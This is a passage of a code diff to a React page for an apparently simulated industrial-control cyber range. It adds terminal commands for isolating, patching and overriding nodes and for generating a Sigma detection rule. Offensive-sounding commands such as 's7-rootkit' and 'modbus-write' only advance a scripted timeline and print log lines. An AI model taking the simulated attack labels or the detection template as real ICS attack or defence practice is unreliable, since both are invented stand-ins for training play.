-          newLogs.push(`[+] SUCCESS: Node ${targetNode.id} (${targetNode.label}) QUARANTINED.`);
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
           newLogs.push(
-            `[*] OT routing table updated. Air-gap barrier engaged. Downstream lateral movement severed.`,
+            `[+] SUCCESS: Node ${targetNode.id} (${targetNode.label}) AIR-GAPPED & QUARANTINED.`,
+            `[*] OT routing table updated. Physical air-gap barrier active.`,
+            `[*] Lateral propagation vector through ${targetNode.label} severed.`,
           );
-          newLogs.push(
-            `[*] INTELLIGENCE: Containment verified. No further downstream nodes reachable.`,
-          );
+          setShareToast(`[AIR-GAP]: ${targetNode.label} ISOLATED`);
         } else {
-          newLogs.push(
-            `[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list available nodes.`,
-          );
+          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list nodes.`);
         }
+      }
+    } else if (cmd === "block-ip" || cmd === "block" || cmd === "firewall") {
+      if (!targetArg) {
+        newLogs.push("[!] ERROR: Please specify IP or node to block (e.g. 'block-ip 10.0.0.45').");
+      } else {
+        if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+        newLogs.push(
+          `[+] SUCCESS: Firewalled and revoked access for host/IP ${targetArg.toUpperCase()}.`,
+          `[*] Threat actor C2 tunnel blackholed at network edge gateway.`,
+        );
+        setShareToast(`[FIREWALL]: REVOKED ACCESS FOR ${targetArg.toUpperCase()}`);
+      }
+    } else if (cmd === "restore-logic" || cmd === "restore") {
+      if (!targetArg) {
+        newLogs.push("[!] ERROR: Specify node ID to restore logic (e.g. 'restore plc-3').");
+      } else {
+        const targetNode = NODES.find(
+          (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
+        );
+        if (targetNode) {
+          triggerNodeTarget(targetNode.id, "patch");
+          setPatchedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+          newLogs.push(
+            `[+] SUCCESS: Golden firmware baseline restored on ${targetNode.id}.`,
+            `[*] Telemetry setpoints restored to nominal operating envelope.`,
+          );
+          setShareToast(`[BASELINE RESTORED]: ${targetNode.label}`);
+        } else {
+          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'.`);
+        }
+      }
+    } else if (
+      cmd === "modbus-cli" ||
+      cmd === "modbus-write" ||
+      cmd === "iec104-inject" ||
+      cmd === "usb-inject" ||
+      cmd === "s7-rootkit"
+    ) {
+      const nextEv = EVENTS.find((ev) => ev.t > t);
+      if (nextEv) {
+        triggerNodeTarget(nextEv.node, "exploit");
+        setT(nextEv.t);
+        newLogs.push(
+          `[+] OFFENSIVE COMMAND EXECUTED: ${raw}`,
+          `[*] Attack phase advanced to T+${fmt(nextEv.t)} · ${nextEv.tag} on ${nextEv.node.toUpperCase()}`,
+          `[*] Payload result: ${nextEv.title}`,
+        );
+      } else {
+        newLogs.push(`[*] OFFENSIVE PAYLOAD DEPLOYED: ${raw}. Target network fully compromised.`);
       }
     } else if (cmd === "reconnect" || cmd === "unisolate") {
       if (!targetArg) {
@@ -1812,6 +2386,7 @@ function SimulationPage() {
           (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
         );
         if (targetNode) {
+          triggerNodeTarget(targetNode.id, "scan");
           setIsolatedNodes((prev) => {
             const next = new Set(prev);
             next.delete(targetNode.id);
@@ -1826,23 +2401,104 @@ function SimulationPage() {
       }
     } else if (cmd === "override") {
       if (!targetArg) {
-        newLogs.push("[!] ERROR: Please specify a target node ID (e.g. 'override plc-7').");
+        newLogs.push(
+          "[!] ERROR: Usage: override <node_id> [parameter] [value] (e.g. 'override plc-3 frequency 60.0').",
+        );
       } else {
         const targetNode = NODES.find(
           (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
         );
         if (targetNode) {
-          if (firstActionTime === null) setFirstActionTime(750);
-          setT(9000);
-          newLogs.push(`[+] SUCCESS: Manual setpoint override issued to ${targetNode.id}.`);
-          newLogs.push(`[*] Telemetry reset to nominal operational parameters.`);
+          triggerNodeTarget(targetNode.id, "override");
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+          const paramName = optArg ? optArg.toLowerCase() : "telemetry";
+          const valNum = parts[3] ? parseFloat(parts[3]) : null;
+
+          if (valNum !== null && !isNaN(valNum)) {
+            if (paramName.includes("freq") || paramName.includes("speed")) {
+              setTargetSpeed(valNum);
+            }
+            newLogs.push(
+              `[+] SUCCESS: Manual setpoint override issued to ${targetNode.id} (${targetNode.label}).`,
+              `[*] Parameter '${paramName}' set to ${valNum}. Telemetry updated.`,
+            );
+          } else {
+            setTargetSpeed(60.0);
+            newLogs.push(
+              `[+] SUCCESS: Manual setpoint override issued to ${targetNode.id} (${targetNode.label}).`,
+              `[*] Telemetry reset to nominal operational parameters (60.0 Hz).`,
+            );
+          }
+          setShareToast(`[OVERRIDE]: APPLIED TO ${targetNode.label}`);
         } else {
-          newLogs.push(
-            `[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list available nodes.`,
-          );
+          newLogs.push(`[!] ERROR: Unknown node '${targetArg}'. Type 'scan' to list nodes.`);
         }
       }
-    } else if (cmd === "patch") {
+    } else if (cmd === "ai-explain" || cmd === "ai" || cmd === "copilot") {
+      setIntelTab("anatomy");
+      newLogs.push(
+        "[+] INITIATING EXPLAINABLE AI COPILOT ANALYSIS...",
+        "[*] Cascading query across Multi-Provider AI Gateway...",
+        `[+] ROOT-CAUSE DIAGNOSIS (${sector.toUpperCase()} SECTOR):`,
+        `    - Purdue Level Breached: Level 1 (PLC/RTU) & Level 3 (SCADA Gateway)`,
+        `    - MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message), T0831 (Manipulation of Control)`,
+        `    - Attack Vector: ${exercise.adversary} exploited unauthenticated SCADA protocol channels (${exercise.protocols}).`,
+        `    - Physical Consequence: System telemetry drift detected on ${taskTarget1.label}.`,
+        `    - Recommended Remediation: Run 'isolate ${taskTarget1.id}' to air-gap PLC and 'patch ${taskTarget1.id}' for attestation.`,
+      );
+      setShareToast("[AI COPILOT]: ANALYSIS COMPLETE");
+    } else if (cmd === "sigma" || cmd === "siem") {
+      setShowSigmaModal(true);
+      newLogs.push(
+        "[+] GENERATING SIEM SIGMA DETECTION RULE (YAML)...",
+        "---",
+        `title: OT SCADA ${exercise.title} Detection`,
+        `id: twinsec-sigma-${sector}-${Date.now().toString(36)}`,
+        "status: production",
+        `description: Detects unauthorized protocol commands targeting ${exercise.adversary} attack vector`,
+        "references:",
+        "  - MITRE ATT&CK for ICS: T0855 / T0831",
+        "logsource:",
+        "  category: network_traffic",
+        "  product: industrial_control_system",
+        "detection:",
+        "  selection:",
+        `    DestinationPort: ${exercise.protocols.includes("Modbus") ? 502 : 2404}`,
+        `    Protocol: "${exercise.protocols}"`,
+        '    PurdueLevel: "Level 1 (PLC)"',
+        "  condition: selection",
+        "falsepositives:",
+        "  - Authorized scheduled engineering maintenance",
+        "level: high",
+      );
+      setShareToast("[SIGMA]: SIEM DETECTION RULE EXPORTED");
+    } else if (cmd === "inject" || cmd === "scenario") {
+      const secArg = targetArg ? targetArg.toLowerCase() : "";
+      const validSectors = [
+        "power",
+        "water",
+        "oil-gas",
+        "manufacturing",
+        "port",
+        "smart-building",
+        "smart-city",
+      ];
+      if (validSectors.includes(secArg)) {
+        if (typeof window !== "undefined") {
+          window.location.search = `?sector=${secArg}`;
+        }
+        newLogs.push(
+          `[+] THREAT CAMPAIGN INJECTED: Active sector switched to '${secArg.toUpperCase()}'.`,
+          `[*] Initializing Digital Twin network topology and kinetic physics engines...`,
+        );
+        setShareToast(`[INJECT]: Switched to ${secArg.toUpperCase()} sector`);
+      } else {
+        newLogs.push(
+          "[!] ERROR: Usage: inject <power|water|oil-gas|manufacturing|port|smart-building|smart-city>",
+          "    Available Sectors: power, water, oil-gas, manufacturing, port, smart-building, smart-city",
+        );
+      }
+    } else if (cmd === "patch" || cmd === "attest") {
       if (!targetArg) {
         newLogs.push("[!] ERROR: Specify target node ID to patch (e.g. 'patch plc-3').");
       } else {
@@ -1850,31 +2506,99 @@ function SimulationPage() {
           (n) => n.id.toLowerCase() === targetArg || n.label.toLowerCase().includes(targetArg),
         );
         if (targetNode) {
+          triggerNodeTarget(targetNode.id, "patch");
           setPatchedNodes((prev) => new Set([...Array.from(prev), targetNode.id]));
-          if (firstActionTime === null) setFirstActionTime(750);
-          setT(6000);
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
           newLogs.push(
             `[+] SUCCESS: Firmware cryptographic attestation patch deployed to ${targetNode.id}.`,
-          );
-          newLogs.push(
             `[*] Ladder logic integrity verified. Adversarial execution vectors blocked.`,
           );
+          setShareToast(`[PATCHED]: ${targetNode.label} SECURED`);
         } else {
           newLogs.push(`[!] ERROR: Unknown node '${targetArg}'.`);
         }
       }
+    } else if (cmd === "play" || cmd === "start" || cmd === "run" || cmd === "resume") {
+      setPlaying(true);
+      newLogs.push("[+] SIMULATION CLOCK STARTED. Real-time physics telemetry active.");
+    } else if (cmd === "pause" || cmd === "stop" || cmd === "halt") {
+      setPlaying(false);
+      newLogs.push("[*] SIMULATION CLOCK PAUSED. Real-time physics telemetry held.");
+    } else if (cmd === "decide") {
+      if (!targetArg || !optArg) {
+        newLogs.push(
+          "[!] ERROR: Usage: decide <d1|d2|d3> <act|defend> (e.g. 'decide d1 act' or 'decide d1 defend').",
+        );
+      } else {
+        const decId = targetArg.toLowerCase();
+        const rawChoice = optArg.toUpperCase();
+        const choice = (rawChoice === "DEFEND" ? "DEFER" : rawChoice) as ChoiceId;
+
+        if (choice === "ACT" || choice === "DEFER" || rawChoice === "DEFEND") {
+          setChoices((prev) => ({ ...prev, [decId]: choice }));
+          if (firstActionTime === null) setFirstActionTime(t > 0 ? t : 750);
+
+          const decObj = DECISIONS.find((d) => d.id.toLowerCase() === decId) || DECISIONS[0];
+          const ev = decObj ? EVENTS.find((e) => e.t === decObj.t) : null;
+          const targetId = ev ? ev.node : NODES[3]?.id || "plc-3";
+          const targetLabel = NODES.find((n) => n.id === targetId)?.label || targetId.toUpperCase();
+
+          if (choice === "ACT") {
+            newLogs.push(
+              `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> ACT`,
+              `[+] MANUAL OVERRIDE DEPLOYED to ${targetLabel}.`,
+              `[*] Telemetry setpoints overridden to safe operational threshold.`,
+            );
+            setShareToast(`[DECISION ACT]: OVERRIDE ISSUED TO ${targetLabel}`);
+          } else {
+            setPatchedNodes((prev) => new Set([...Array.from(prev), targetId]));
+            setIsolatedNodes((prev) => new Set([...Array.from(prev), targetId]));
+            newLogs.push(
+              `[+] DECISION EXECUTED: ${decId.toUpperCase()} -> DEFEND`,
+              `[+] DEFENSE ENFORCED: Cryptographic patch & air-gap isolation applied to ${targetLabel}.`,
+              `[*] Adversary cascade blocked. Systems secured.`,
+            );
+            setShareToast(`[DECISION DEFEND]: ${targetLabel} PATCHED & AIR-GAPPED`);
+          }
+
+          setActiveDecision(null);
+          setPlaying(true);
+        } else {
+          newLogs.push(`[!] ERROR: Invalid choice '${optArg}'. Must be act or defend.`);
+        }
+      }
+    } else if (cmd === "hint" || cmd === "ai-hint" || cmd === "assist") {
+      const currentTarget = taskTarget1.id;
+      const isTargetIsolated = isolatedNodes.has(currentTarget);
+      const isTargetPatched = patchedNodes.has(currentTarget);
+      newLogs.push(
+        `[*] TACTICAL CYBER RANGE ADVISORY (${sector.toUpperCase()} SECTOR):`,
+        `    - Current Threat Target: ${taskTarget1.label} (${currentTarget.toUpperCase()})`,
+        `    - Action Option 1: Run 'isolate ${currentTarget}' to sever physical air-gap cascade.`,
+        `    - Action Option 2: Run 'patch ${currentTarget}' to apply cryptographic firmware patch.`,
+        `    - Action Option 3: Run 'decide d1 act' or 'decide d1 defend' to execute strategy.`,
+        `    - Air-Gap Status: ${isTargetIsolated ? "[AIR-GAPPED/CONTAINED]" : "[EXPOSED]"} | Patch Status: ${isTargetPatched ? "[PATCHED]" : "[UNPATCHED]"}`,
+      );
     } else if (cmd === "status") {
-      newLogs.push(`[*] LIVE REAL-TIME TELEMETRY & CONTAINMENT METRICS:`);
-      newLogs.push(`    Rotor Speed:      ${speedHz.toFixed(2)} Hz`);
-      newLogs.push(`    Bearing Temp:     ${bearingC.toFixed(1)} °C`);
-      newLogs.push(`    Feeder Press:     ${pressure.toFixed(2)} bar`);
-      newLogs.push(`    Simulation Clock: T+${fmt(t)}`);
-      newLogs.push(`    MTTD (Detection): ${graphState.mttdFormatted}`);
-      newLogs.push(`    MTTR (Recovery):  ${graphState.mttrFormatted}`);
-      newLogs.push(`    Branch Outcome:   ${graphState.outcomeBranch}`);
-      newLogs.push(`    Impact Shed:      ${graphState.mwShed} MW`);
-      newLogs.push(`    Air-Gapped Nodes: ${isolatedNodes.size}`);
-      newLogs.push(`    Protected Nodes:  ${blockedNodes.size}`);
+      const ml = graphState.mlClassification;
+      newLogs.push(
+        `[*] LIVE REAL-TIME TELEMETRY & CONTAINMENT METRICS (${sector.toUpperCase()} SECTOR):`,
+        `    Rotor / Process Speed: ${speedHz.toFixed(2)} Hz`,
+        `    Bearing / System Temp: ${bearingC.toFixed(1)} °C`,
+        `    Feeder Pressure:       ${pressure.toFixed(2)} bar`,
+        `    Simulation Clock:      T+${fmt(t)}`,
+        `    MTTD (Detection Time): ${graphState.mttdFormatted}`,
+        `    MTTR (Recovery Time):  ${graphState.mttrFormatted}`,
+        `    Financial Cost Impact: ${graphState.costFormatted}`,
+        `    Impact Value Shed:     ${graphState.impactFormatted}`,
+        `    Branch Outcome:        ${graphState.outcomeBranch}`,
+        `    Air-Gapped Nodes:      ${isolatedNodes.size}`,
+        `    Protected Nodes:       ${blockedNodes.size}`,
+        `[+] CYBERX-AI ML THREAT CLASSIFIER:`,
+        `    Threat State:          [${ml.threatState}] (Score: ${(ml.anomalyScore * 100).toFixed(0)}%)`,
+        `    Primary Drift Feature: ${ml.topFeature}`,
+        `    Z-Scores:              Freq: ${ml.zScores.frequency} | Press: ${ml.zScores.pressure} | Temp: ${ml.zScores.temperature} | Chlor: ${ml.zScores.chlorine}`,
+      );
     } else {
       newLogs.push(`[!] Command not recognized: '${raw}'. Type 'help' for available commands.`);
     }
@@ -1915,6 +2639,11 @@ function SimulationPage() {
       const wasPlaying = playing;
       setPlaying(false);
       await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
+
+      const [{ toPng }, { default: jsPDF }] = await Promise.all([
+        import("html-to-image"),
+        import("jspdf"),
+      ]);
 
       const bg = "#0a0a0c";
       const fg = "#f4efe6";
@@ -2133,214 +2862,154 @@ function SimulationPage() {
     }
   }, [t, targetSpeed, choices, outcome, compromisedNodes, activeIdx, playing, exercise]);
 
-  if (viewPhase === "briefing") {
-    return (
-      <MissionBriefing
-        scenario={currentScenario}
-        onStartSimulation={() => {
-          setViewPhase("live");
-          setPlaying(true);
-        }}
-      />
-    );
-  }
-
   return (
-    <main className="min-h-screen bg-background text-foreground flex flex-col">
+    <main ref={revealRef} className="min-h-screen bg-background text-foreground flex flex-col">
       {/* Impact tick — silent flash on event crossing */}
       <ImpactTick key={impactKey} />
 
-      <StatusBar t={t} playing={playing} compromised={compromisedNodes.size} speed={displaySpeed} />
+      <StatusBar
+        t={t}
+        playing={playing}
+        compromised={compromisedNodes.size}
+        speed={displaySpeed}
+        live={liveMetrics}
+        halt={halt}
+      />
 
-      <section className="grid grid-cols-12 border-b border-rule">
-        {/* LEFT — meta */}
-        <aside className="col-span-12 lg:col-span-3 border-b lg:border-b-0 border-r-0 lg:border-r border-rule p-6 sm:p-8 lg:p-10 flex flex-col gap-6 lg:gap-8 bg-card/20">
-          <div className="space-y-3">
-            <p className="mono-label text-foreground/60 text-xs tracking-widest uppercase">
-              TARGET SECTOR · {sector.toUpperCase()} // SEVERITY: CRITICAL
-            </p>
+      {/* SECTION 01 — FULL-SCREEN EXPANSIVE COMMAND BRIDGE TOPOLOGY VIEWPORT */}
+      <section
+        id="snapshot-topology"
+        className="relative w-full border-b border-rule min-h-[640px] sm:min-h-[720px] lg:min-h-[820px] bg-background flex flex-col justify-between overflow-hidden"
+      >
+        {/* Background Canvas: High-Resolution Schematic & Grid Rules */}
+        <div className="absolute inset-0 grid-bg opacity-30 pointer-events-none" />
+        <img
+          src={schematic}
+          alt=""
+          aria-hidden
+          className="absolute inset-0 h-full w-full object-cover opacity-10 pointer-events-none"
+        />
+        <div className="absolute inset-0 scanline pointer-events-none opacity-40" />
 
+        {/* TOP COMMAND HUD: Exercise Meta, Status & Breadcrumbs */}
+        <div className="relative z-10 border-b border-rule bg-background/85 backdrop-blur-sm px-5 sm:px-6 lg:px-10 py-3.5 flex flex-wrap items-center justify-between gap-4">
+          <div className="flex flex-wrap items-baseline gap-3 sm:gap-6">
+            <span className="mono-label px-2.5 py-1 bg-accent text-accent-foreground font-bold text-xs">
+              {sector.toUpperCase()} RANGE
+            </span>
             <div>
-              <p className="mono-label text-foreground/40 text-[10px] tracking-wider uppercase">
-                EXERCISE HOLLOW · SUBSTATION-07 SUBSTATION CASCADE
-              </p>
-              <h1 className="display text-4xl sm:text-5xl lg:text-6xl mt-2 leading-[0.88] uppercase tracking-tight">
+              <h1 className="display text-2xl sm:text-3xl lg:text-4xl leading-none inline-block">
                 {exercise.title}
                 <span className="text-accent">.</span>
               </h1>
-              <p className="font-serif italic text-sm sm:text-base text-foreground/80 mt-3 leading-snug">
-                {exercise.site}. {exercise.byline}
-              </p>
-            </div>
-          </div>
-
-          <div className="hairline" />
-
-          <dl className="grid grid-cols-2 gap-y-4 gap-x-4 font-mono text-xs">
-            <Stat k="OPERATOR" v="N. ARENS" />
-            <Stat k="ADVERSARY" v={exercise.adversary} />
-            <Stat k="TWIN BUILD" v="2026.06.11" />
-            <Stat k="PROTOCOLS" v={exercise.protocols} />
-          </dl>
-
-          {/* UNIFIED COMMAND & TASK HUB */}
-          <div className="border border-rule bg-card/40 p-4 space-y-3 font-mono text-xs">
-            <div className="flex items-center justify-between border-b border-rule pb-2">
-              <p className="mono-label text-[10px] text-accent font-bold uppercase tracking-wider">
-                COMMAND & TASK HUB
-              </p>
-              <span className="text-[9px] text-foreground/50">OPERATOR CONTROL</span>
-            </div>
-
-            <div className="space-y-2 text-[11px]">
-              <div className="flex items-start gap-2">
-                <span className="text-accent font-bold">[1]</span>
-                <span className="text-foreground/80">Scan SCADA nodes to map target topology</span>
-              </div>
-              <div className="flex items-start gap-2">
-                <span className="text-accent font-bold">[2]</span>
-                <span className="text-foreground/80">
-                  Isolate compromised PLC-3 via air-gap barrier
-                </span>
-              </div>
-              <div className="flex items-start gap-2">
-                <span className="text-accent font-bold">[3]</span>
-                <span className="text-foreground/80">Apply firmware patch to PLC-3</span>
-              </div>
-              <div className="flex items-start gap-2">
-                <span className="text-accent font-bold">[4]</span>
-                <span className="text-foreground/80">
-                  Override setpoints on PLC-7 & query status
-                </span>
-              </div>
-            </div>
-
-            <div className="pt-2 flex flex-col gap-2">
-              <button
-                onClick={() => {
-                  setTerminalOpen(true);
-                  const fakeForm = { preventDefault: () => {} } as React.FormEvent<HTMLFormElement>;
-                  setTerminalInput("scan");
-                  setTimeout(() => handleTerminalSubmit(fakeForm), 50);
-                }}
-                className="w-full border border-accent bg-accent text-accent-foreground py-2 font-bold hover:bg-foreground hover:text-background transition-colors cursor-pointer text-center uppercase tracking-wider text-[11px]"
-              >
-                LAUNCH CLI & EXECUTE SCAN →
-              </button>
-              <button
-                onClick={() => setViewPhase("briefing")}
-                className="w-full border border-rule bg-background/40 text-foreground/70 py-1.5 font-bold hover:border-accent hover:text-accent transition-colors cursor-pointer text-center text-[10px] uppercase tracking-wider"
-              >
-                PRE-SIMULATION MISSION BRIEFING
-              </button>
-            </div>
-          </div>
-
-          <div className="mt-auto pt-4 border-t border-rule">
-            <div className="flex justify-between items-center mb-3">
-              <p className="mono-label text-[10px] text-accent">PHYSICS · EVENT ENGINE LIVE</p>
-              <span className="text-[9px] font-mono text-foreground/50 uppercase">
-                REAL-TIME MATH
+              <span className="font-serif italic text-xs sm:text-sm text-foreground/70 ml-3">
+                {exercise.site} — {exercise.byline}
               </span>
             </div>
-            <div className="space-y-3">
-              <Gauge label="ROTOR" unit="Hz" value={speedHz} min={48} max={54} crit={52.5} />
-              <Gauge label="BEARING" unit="°C" value={bearingC} min={50} max={120} crit={95} />
-              <Gauge label="FEEDER" unit="bar" value={pressure} min={6} max={9} crit={7} invert />
-            </div>
-          </div>
-        </aside>
-
-        {/* CENTER — topology */}
-        <div
-          id="snapshot-topology"
-          className="col-span-12 lg:col-span-6 border-b lg:border-b-0 border-r-0 lg:border-r border-rule relative min-h-[480px] sm:min-h-[560px] lg:min-h-[640px] bg-background"
-        >
-          <div className="absolute inset-0 grid-bg opacity-30" />
-          <img
-            src={schematic}
-            alt=""
-            aria-hidden
-            className="absolute inset-0 h-full w-full object-cover opacity-10"
-          />
-          <div className="absolute inset-0 scanline pointer-events-none opacity-50" />
-
-          <div className="absolute top-4 sm:top-5 left-4 sm:left-6 right-4 sm:right-6 flex justify-between mono-label z-10">
-            <span>FIG. 01 — PROPAGATION TOPOLOGY</span>
-            <span className="text-accent flex items-center gap-2">
-              <span className="size-1.5 bg-accent animate-pulse-dot" /> LIVE
-            </span>
           </div>
 
-          <Topology2D
-            nodes={NODES}
-            edges={EDGES}
-            compromised={compromisedNodes}
-            blockedNodes={blockedNodes}
-            isolatedNodes={isolatedNodes}
-            selected={selected}
-            onSelect={(id, source) => handleSelectNode(id, source)}
-            t={t}
-            activeNode={activeIdx >= 0 ? EVENTS[activeIdx].node : null}
-          />
-
-          <div className="absolute bottom-4 sm:bottom-5 left-4 sm:left-6 right-4 sm:right-6 flex justify-between mono-label z-10">
-            <span>
-              {NODES.length} NODES · {EDGES.length} LINKS
+          <div className="flex flex-wrap items-center gap-4 sm:gap-6 mono-label text-xs">
+            <span className="text-foreground/70 hidden md:inline">
+              OPERATOR:{" "}
+              <span className="text-foreground font-bold">{operator?.callsign ?? "N. ARENS"}</span>
             </span>
-            <span className="text-foreground/60">
-              CASCADE DEPTH ·{" "}
-              <span className="text-foreground">
-                {Math.max(...NODES.filter((n) => compromisedNodes.has(n.id)).map((n) => n.ring), 0)}
-                /5
-              </span>
+            <span className="text-foreground/70 hidden sm:inline">
+              ADVERSARY: <span className="text-accent font-bold">{exercise.adversary}</span>
+            </span>
+            <span className="text-foreground/70 hidden lg:inline">
+              PROTOCOLS: <span className="text-foreground">{exercise.protocols}</span>
+            </span>
+            <span className="flex items-center gap-2 text-accent font-bold px-2 py-1 border border-accent/40 bg-accent/10">
+              <span className="size-2 bg-accent animate-pulse-dot" />
+              LIVE {Math.round(displaySpeed)}×
             </span>
           </div>
         </div>
 
-        {/* RIGHT — current frame summary */}
-        <aside
+        {/* CENTER VIEWPORT: EXPANSIVE EDGE-TO-EDGE TOPOLOGY CANVAS */}
+        <div className="relative flex-1 w-full min-h-[440px] sm:min-h-[500px] lg:min-h-[560px] p-2 sm:p-4">
+          <Topology2D
+            nodes={NODES}
+            edges={EDGES}
+            compromised={compromisedNodes}
+            selected={selected}
+            onSelect={(id, source) => handleSelectNode(id, source)}
+            t={t}
+            activeNode={activeIdx >= 0 ? EVENTS[activeIdx].node : null}
+            isolatedNodes={isolatedNodes}
+            commandActiveNode={commandActiveNode}
+            commandActiveAction={commandActiveAction}
+          />
+        </div>
+
+        {/* BOTTOM INTEGRATED TELEMETRY & TACTICAL DOCK */}
+        <div
           id="snapshot-frame"
-          className="col-span-12 lg:col-span-3 p-6 sm:p-8 lg:p-10 pt-16 lg:pt-14 flex flex-col gap-6 sm:gap-8 bg-background"
+          className="relative z-10 border-t border-rule bg-background/95 backdrop-blur-sm px-5 sm:px-6 lg:px-10 py-4 grid grid-cols-1 md:grid-cols-12 gap-4 sm:gap-6 items-center"
         >
-          <div>
-            <p className="mono-label">CURRENT FRAME</p>
-            <p className="display text-4xl sm:text-5xl mt-3 leading-none">
-              {activeIdx >= 0 ? EVENTS[activeIdx].tag.split(" ")[0] : "STANDBY"}
-            </p>
-            <p className="font-serif italic text-base sm:text-lg text-foreground/70 mt-3 leading-snug">
-              {activeIdx >= 0 ? EVENTS[activeIdx].title : "Awaiting initial access vector."}
-            </p>
+          {/* Col 1: Real-time Physics Telemetry Gauges (md:col-span-5) */}
+          <div className="md:col-span-5 grid grid-cols-3 gap-3 border-r-0 md:border-r border-rule pr-0 md:pr-4">
+            <Gauge label="ROTOR" unit="Hz" value={speedHz} min={48} max={54} crit={52.5} />
+            <Gauge label="BEARING" unit="°C" value={bearingC} min={50} max={120} crit={95} />
+            <Gauge label="FEEDER" unit="bar" value={pressure} min={6} max={9} crit={7} invert />
           </div>
 
-          <div className="border border-rule">
-            <div className="p-4 sm:p-5 border-b border-rule flex justify-between items-center">
-              <span className="mono-label">FRAME</span>
-              <span className="mono-label text-accent tabular-nums">
-                {activeIdx + 1} / {EVENTS.length}
+          {/* Col 2: Active Phase & Frame Telemetry (md:col-span-4) */}
+          <div className="md:col-span-4 font-mono text-xs space-y-1.5 border-r-0 md:border-r border-rule pr-0 md:pr-4">
+            <div className="flex items-center justify-between">
+              <span className="mono-label text-[10px] text-foreground/50">ACTIVE PHASE</span>
+              <span className="mono-label text-accent font-bold text-xs">
+                {activeIdx >= 0 ? EVENTS[activeIdx].tag : "STANDBY"}
               </span>
             </div>
-            <div className="p-4 sm:p-5 space-y-3 font-mono text-xs text-foreground/70">
-              <Row k="origin" v={activeIdx >= 0 ? EVENTS[activeIdx].node.toUpperCase() : "—"} />
-              <Row k="severity" v={activeIdx >= 0 ? EVENTS[activeIdx].sev : "—"} />
-              <Row k="t_event" v={activeIdx >= 0 ? `T+${fmt(EVENTS[activeIdx].t)}` : "—"} />
-              <Row k="t_clock" v={`T+${fmt(t)}`} />
-              <Row k="speed" v={`${Math.round(displaySpeed)}×`} />
+            <div className="flex items-center justify-between text-[11px] text-foreground/80">
+              <span className="truncate">
+                ORIGIN:{" "}
+                <span className="font-bold text-foreground">
+                  {activeIdx >= 0 ? EVENTS[activeIdx].node.toUpperCase() : "—"}
+                </span>
+              </span>
+              <span className="mono-label text-[10px] px-1.5 py-0.5 border border-rule">
+                {activeIdx >= 0 ? EVENTS[activeIdx].sev : "NOMINAL"}
+              </span>
+            </div>
+            <div className="flex justify-between text-[10px] text-foreground/60">
+              <span>
+                CASCADE:{" "}
+                {Math.max(...NODES.filter((n) => compromisedNodes.has(n.id)).map((n) => n.ring), 0)}
+                /5
+              </span>
+              <span>
+                BREACHED: {compromisedNodes.size}/{NODES.length}
+              </span>
+              <span>CONTAINED: {isolatedNodes.size + patchedNodes.size}</span>
             </div>
           </div>
 
-          <div>
-            <p className="mono-label">RECENT TELEMETRY</p>
-            <Sparkline t={t} />
+          {/* Col 3: Direct Tactical Action Triggers (md:col-span-3) */}
+          <div className="md:col-span-3 flex flex-col sm:flex-row md:flex-col gap-2">
+            <button
+              onClick={() => setSelected(activeIdx >= 0 ? EVENTS[activeIdx].node : NODES[0].id)}
+              className="w-full bg-accent text-accent-foreground mono-label py-2.5 px-4 font-bold text-xs hover:bg-foreground hover:text-background transition-colors text-center cursor-pointer"
+            >
+              OPEN ASSET DOSSIER →
+            </button>
+            <div className="flex gap-2">
+              <button
+                onClick={() => setBriefingOpen(true)}
+                className="flex-1 border border-rule mono-label py-1.5 px-2 text-[10px] hover:border-accent hover:text-accent transition-colors text-center cursor-pointer"
+              >
+                MISSION BRIEF
+              </button>
+              <button
+                onClick={() => setTerminalOpen(true)}
+                className="flex-1 border border-rule mono-label py-1.5 px-2 text-[10px] hover:border-accent hover:text-accent transition-colors text-center cursor-pointer"
+              >
+                CLI TERMINAL [~_]
+              </button>
+            </div>
           </div>
-
-          <button
-            onClick={() => setSelected(activeIdx >= 0 ? EVENTS[activeIdx].node : NODES[0].id)}
-            className="bg-accent text-accent-foreground mono-label py-3 hover:bg-foreground hover:text-background transition-colors"
-          >
-            OPEN ASSET DOSSIER →
-          </button>
-        </aside>
+        </div>
       </section>
 
       {/* TIMELINE / LOG */}
@@ -2430,17 +3099,17 @@ function SimulationPage() {
                         </p>
                         {e.status === "BLOCKED_AIRGAP" && (
                           <span className="mono-label text-[10px] px-2 py-0.5 bg-amber-500/20 text-amber-400 border border-amber-500/50">
-                            🛡️ AIR-GAP DEFENSE
+                            [AIR-GAP DEFENSE]
                           </span>
                         )}
                         {e.status === "PREVENTED_UPSTREAM" && (
                           <span className="mono-label text-[10px] px-2 py-0.5 bg-sky-500/20 text-sky-400 border border-sky-500/50">
-                            🔒 BLOCKED UPSTREAM
+                            [BLOCKED UPSTREAM]
                           </span>
                         )}
                         {e.status === "PATCHED" && (
                           <span className="mono-label text-[10px] px-2 py-0.5 bg-emerald-500/20 text-emerald-400 border border-emerald-500/50">
-                            ✅ PATCHED / ATTESTED
+                            [PATCHED / ATTESTED]
                           </span>
                         )}
                       </div>
@@ -2546,64 +3215,172 @@ function SimulationPage() {
         </div>
       </section>
 
-      {/* SECTION 04 — TACTICAL THREAT INTELLIGENCE & EXPLAINABLE AI */}
-      <section className="border-b border-rule bg-background py-16 sm:py-20 px-5 sm:px-6 lg:px-10">
+      {/* SECTION 04 — EXPLAINABLE AI & THREAT DIAGNOSTICS */}
+      <section
+        data-reveal
+        className="border-b border-rule bg-background py-16 sm:py-20 px-5 sm:px-6 lg:px-10"
+      >
         <div className="mx-auto max-w-[1600px] space-y-8">
           <div className="flex flex-wrap items-baseline justify-between border-b border-rule pb-6">
             <div>
               <p className="mono-label text-accent">
